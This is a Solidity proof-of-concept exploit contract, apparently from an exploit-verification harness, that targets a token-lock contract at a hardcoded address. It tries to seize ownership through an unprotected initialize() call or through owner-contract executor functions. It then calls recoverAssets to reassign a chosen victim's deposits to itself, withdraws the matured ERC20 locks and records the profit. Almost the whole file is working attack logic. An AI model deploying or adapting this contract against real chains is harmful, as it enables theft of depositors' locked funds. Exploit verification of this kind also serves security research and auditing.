// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface ILockTokenLike {
    function owner() external view returns (address);
    function initialize() external;
    function getAllDepositIds() external view returns (uint256[] memory);
    function getDepositDetails(uint256 id)
        external
        view
        returns (
            address tokenAddress,
            address withdrawalAddress,
            uint256 tokenAmount,
            uint256 unlockTime,
            bool withdrawn,
            uint256 tokenId,
            bool isNft,
            uint256 migratedLockDepositId,
            bool isNftMinted
        );
    function recoverAssets(address user, address newRecipient) external;
    function withdrawTokens(uint256 id, uint256 amount) external;
    function getDepositsByWithdrawalAddress(address user) external view returns (uint256[] memory);
}

contract FlawVerifier {
    address public constant TARGET = 0xE2fE530C047f2d85298b07D9333C05737f1435fB;

    address private realizedProfitToken;
    uint256 private realizedProfitAmount;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public profitAchieved;
    bool public recoverStageReached;
    bool public victimIndexCleared;

    address public targetOwner;
    address public selectedVictim;
    uint256 public selectedDepositId;
    string public exploitPathUsed;
    string public failureReason;

    constructor() {}

    struct DepositView {
        address tokenAddress;
        address withdrawalAddress;
        uint256 tokenAmount;
        uint256 unlockTime;
        bool withdrawn;
        bool isNft;
    }

    struct Candidate {
        address victim;
        uint256 anchorDepositId;
        uint256 immediateERC20Amount;
        bool hasImmediateERC20;
        bool hasDeposits;
    }

    function executeOnOpportunity() external {
        _resetState();

        // Path stage 0: identify a real victim whose deposits already exist on-chain.
        Candidate memory candidate = _selectBestCandidate();
        if (candidate.victim == address(0)) {
            hypothesisValidated = true;
            hypothesisRefuted = true;
            failureReason = "no live victim deposits on target";
            return;
        }

        uint256[] memory victimDepositIds = _getVictimDepositIds(candidate.victim);
        if (victimDepositIds.length == 0) {
            hypothesisValidated = true;
            hypothesisRefuted = true;
            failureReason = "victim has no deposits at execution";
            return;
        }

        selectedVictim = candidate.victim;
        selectedDepositId = candidate.anchorDepositId;
        exploitPathUsed =
            "owner calls recoverAssets(victim, attacker) -> contract rewrites victim deposits to attacker -> attacker withdraws matured ERC20 locks";

        (address[] memory trackedTokens, uint256[] memory baselineBalances, uint256 trackedCount) =
            _snapshotTrackedTokens(victimDepositIds);

        // Path stage 1: make the target's current owner perform recoverAssets(victim, attacker).
        if (!_reachRecoverStage(candidate.victim, address(this))) {
            hypothesisValidated = false;
            hypothesisRefuted = true;
            return;
        }

        recoverStageReached = true;
        victimIndexCleared = _victimDepositsCleared(candidate.victim);

        // Path stage 2 and 3: the attacker now owns the victim's locks and withdraws matured ERC20 positions.
        _withdrawMaturedReassignedAssets(victimDepositIds);
        _finalizeProfit(trackedTokens, baselineBalances, trackedCount);

        hypothesisValidated = true;
        hypothesisRefuted = false;

        if (!profitAchieved) {
            if (!candidate.hasImmediateERC20) {
                failureReason = "recoverAssets executed but no matured ERC20 victim lock existed for immediate profit";
            } else {
                failureReason = "recoverAssets executed but no net ERC20 balance increase was realized";
            }
        }
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitAmount;
    }

    function _resetState() internal {
        realizedProfitToken = address(0);
        realizedProfitAmount = 0;
        hypothesisValidated = false;
        hypothesisRefuted = false;
        profitAchieved = false;
        recoverStageReached = false;
        victimIndexCleared = false;
        targetOwner = address(0);
        selectedVictim = address(0);
        selectedDepositId = 0;
        exploitPathUsed = "";
        failureReason = "";
    }

    function _reachRecoverStage(address victim, address newRecipient) internal returns (bool) {
        targetOwner = _ownerOfTarget();

        if (targetOwner == address(this)) {
            if (_recoverAssets(victim, newRecipient)) {
                return _didRecover(victim, newRecipient);
            }
        }

        // Concrete owner-stage check: if the proxy was left uninitialized, initialize() makes this
        // verifier the owner without any non-public action. That preserves the finding's stated path.
        _tryInitializeTarget();
        targetOwner = _ownerOfTarget();

        if (targetOwner == address(this)) {
            if (_recoverAssets(victim, newRecipient)) {
                return _didRecover(victim, newRecipient);
            }
            failureReason = "target owner is verifier but recoverAssets still failed";
            return false;
        }

        if (targetOwner == address(0)) {
            failureReason = "target owner is unset and initialize did not claim ownership";
            return false;
        }

        if (targetOwner.code.length == 0) {
            // At this fork the required stage is mechanically blocked: only the EOA owner can call
            // recoverAssets(), and a deployed verifier contract cannot force that EOA to submit a tx.
            failureReason = "target owner is an EOA; no public on-chain route can satisfy onlyOwner";
            return false;
        }

        bytes memory recoverCalldata =
            abi.encodeWithSelector(ILockTokenLike.recoverAssets.selector, victim, newRecipient);

        // If the owner is itself a contract, only a public executor on that owner can preserve the
        // exploit path without cheating. Probe common executor surfaces and accept success only if
        // the victim's deposits are actually reassigned on-chain.
        if (_callOwnerExecutor(targetOwner, abi.encodeWithSignature("execute(address,uint256,bytes)", TARGET, 0, recoverCalldata))) {
            return true;
        }
        if (_callOwnerExecutor(targetOwner, abi.encodeWithSignature("execute(address,bytes)", TARGET, recoverCalldata))) {
            return true;
        }
        if (_callOwnerExecutor(targetOwner, abi.encodeWithSignature("exec(address,uint256,bytes)", TARGET, 0, recoverCalldata))) {
            return true;
        }
        if (_callOwnerExecutor(targetOwner, abi.encodeWithSignature("exec(address,bytes)", TARGET, recoverCalldata))) {
            return true;
        }
        if (_callOwnerExecutor(targetOwner, abi.encodeWithSignature("invoke(address,bytes)", TARGET, recoverCalldata))) {
            return true;
        }
        if (_callOwnerExecutor(targetOwner, abi.encodeWithSignature("forward(address,bytes)", TARGET, recoverCalldata))) {
            return true;
        }
        if (
            _callOwnerExecutor(
                targetOwner,
                abi.encodeWithSignature("executeTransaction(address,uint256,string,bytes)", TARGET, 0, "", recoverCalldata)
            )
        ) {
            return true;
        }

        failureReason = "owner is a contract but exposes no successful public executor for recoverAssets";
        return false;
    }

    function _callOwnerExecutor(address ownerContract, bytes memory payload) internal returns (bool) {
        (bool ok,) = ownerContract.call(payload);
        if (!ok) {
            return false;
        }
        return _didRecover(selectedVictim, address(this));
    }

    function _tryInitializeTarget() internal {
        (bool ok,) = TARGET.call(abi.encodeWithSelector(ILockTokenLike.initialize.selector));
        ok;
    }

    function _didRecover(address victim, address newRecipient) internal view returns (bool) {
        if (_victimDepositsCleared(victim)) {
            return true;
        }

        uint256[] memory attackerDeposits;
        try ILockTokenLike(TARGET).getDepositsByWithdrawalAddress(newRecipient) returns (uint256[] memory ids) {
            attackerDeposits = ids;
        } catch {
            return false;
        }

        for (uint256 i = 0; i < attackerDeposits.length; ++i) {
            DepositView memory dep = _readDeposit(attackerDeposits[i]);
            if (!dep.withdrawn && dep.withdrawalAddress == newRecipient) {
                return true;
            }
        }

        return false;
    }

    function _selectBestCandidate() internal view returns (Candidate memory best) {
        uint256[] memory ids;
        try ILockTokenLike(TARGET).getAllDepositIds() returns (uint256[] memory returnedIds) {
            ids = returnedIds;
        } catch {
            return best;
        }

        for (uint256 i = 0; i < ids.length; ++i) {
            DepositView memory dep = _readDeposit(ids[i]);
            if (dep.withdrawn || dep.withdrawalAddress == address(0)) {
                continue;
            }

            if (!best.hasDeposits) {
                best.victim = dep.withdrawalAddress;
                best.anchorDepositId = ids[i];
                best.hasDeposits = true;
            }

            if (!dep.isNft && dep.unlockTime <= block.timestamp && dep.tokenAmount > 0) {
                if (!best.hasImmediateERC20 || dep.tokenAmount > best.immediateERC20Amount) {
                    best.victim = dep.withdrawalAddress;
                    best.anchorDepositId = ids[i];
                    best.immediateERC20Amount = dep.tokenAmount;
                    best.hasImmediateERC20 = true;
                    best.hasDeposits = true;
                }
            }
        }
    }

    function _getVictimDepositIds(address victim) internal view returns (uint256[] memory victimIds) {
        uint256[] memory ids;
        try ILockTokenLike(TARGET).getAllDepositIds() returns (uint256[] memory returnedIds) {
            ids = returnedIds;
        } catch {
            return new uint256[](0);
        }

        uint256 count = 0;
        for (uint256 i = 0; i < ids.length; ++i) {
            DepositView memory dep = _readDeposit(ids[i]);
            if (!dep.withdrawn && dep.withdrawalAddress == victim) {
                count++;
            }
        }

        victimIds = new uint256[](count);
        uint256 cursor = 0;
        for (uint256 i = 0; i < ids.length; ++i) {
            DepositView memory dep = _readDeposit(ids[i]);
            if (!dep.withdrawn && dep.withdrawalAddress == victim) {
                victimIds[cursor] = ids[i];
                cursor++;
            }
        }
    }

    function _snapshotTrackedTokens(uint256[] memory victimDepositIds)
        internal
        view
        returns (address[] memory trackedTokens, uint256[] memory baselineBalances, uint256 trackedCount)
    {
        trackedTokens = new address[](victimDepositIds.length);
        baselineBalances = new uint256[](victimDepositIds.length);

        for (uint256 i = 0; i < victimDepositIds.length; ++i) {
            DepositView memory dep = _readDeposit(victimDepositIds[i]);
            if (dep.isNft || dep.withdrawn || dep.unlockTime > block.timestamp || dep.tokenAddress == address(0)) {
                continue;
            }

            bool exists = false;
            for (uint256 j = 0; j < trackedCount; ++j) {
                if (trackedTokens[j] == dep.tokenAddress) {
                    exists = true;
                    break;
                }
            }
            if (exists) {
                continue;
            }

            trackedTokens[trackedCount] = dep.tokenAddress;
            baselineBalances[trackedCount] = _balanceOf(dep.tokenAddress, address(this));
            trackedCount++;
        }
    }

    function _withdrawMaturedReassignedAssets(uint256[] memory victimDepositIds) internal {
        for (uint256 i = 0; i < victimDepositIds.length; ++i) {
            DepositView memory dep = _readDeposit(victimDepositIds[i]);
            if (dep.withdrawn || dep.isNft || dep.withdrawalAddress != address(this) || dep.unlockTime > block.timestamp) {
                continue;
            }
            _withdrawTokens(victimDepositIds[i], dep.tokenAmount);
        }
    }

    function _finalizeProfit(
        address[] memory trackedTokens,
        uint256[] memory baselineBalances,
        uint256 trackedCount
    ) internal {
        for (uint256 i = 0; i < trackedCount; ++i) {
            uint256 postBalance = _balanceOf(trackedTokens[i], address(this));
            if (postBalance <= baselineBalances[i]) {
                continue;
            }

            uint256 delta = postBalance - baselineBalances[i];
            if (delta > realizedProfitAmount) {
                realizedProfitAmount = delta;
                realizedProfitToken = trackedTokens[i];
                profitAchieved = true;
            }
        }
    }

    function _readDeposit(uint256 id) internal view returns (DepositView memory dep) {
        try ILockTokenLike(TARGET).getDepositDetails(id) returns (
            address tokenAddress,
            address withdrawalAddress,
            uint256 tokenAmount,
            uint256 unlockTime,
            bool withdrawn,
            uint256,
            bool isNft,
            uint256,
            bool
        ) {
            dep.tokenAddress = tokenAddress;
            dep.withdrawalAddress = withdrawalAddress;
            dep.tokenAmount = tokenAmount;
            dep.unlockTime = unlockTime;
            dep.withdrawn = withdrawn;
            dep.isNft = isNft;
        } catch {}
    }

    function _ownerOfTarget() internal view returns (address currentOwner) {
        try ILockTokenLike(TARGET).owner() returns (address ownerAddress) {
            return ownerAddress;
        } catch {
            return address(0);
        }
    }

    function _recoverAssets(address user, address newRecipient) internal returns (bool ok) {
        (ok,) = TARGET.call(abi.encodeWithSelector(ILockTokenLike.recoverAssets.selector, user, newRecipient));
    }

    function _withdrawTokens(uint256 id, uint256 amount) internal returns (bool ok) {
        (ok,) = TARGET.call(abi.encodeWithSelector(ILockTokenLike.withdrawTokens.selector, id, amount));
    }

    function _victimDepositsCleared(address victim) internal view returns (bool) {
        try ILockTokenLike(TARGET).getDepositsByWithdrawalAddress(victim) returns (uint256[] memory ids) {
            return ids.length == 0;
        } catch {
            return false;
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        try IERC20Like(token).balanceOf(account) returns (uint256 bal) {
            return bal;
        } catch {
            return 0;
        }
    }
}
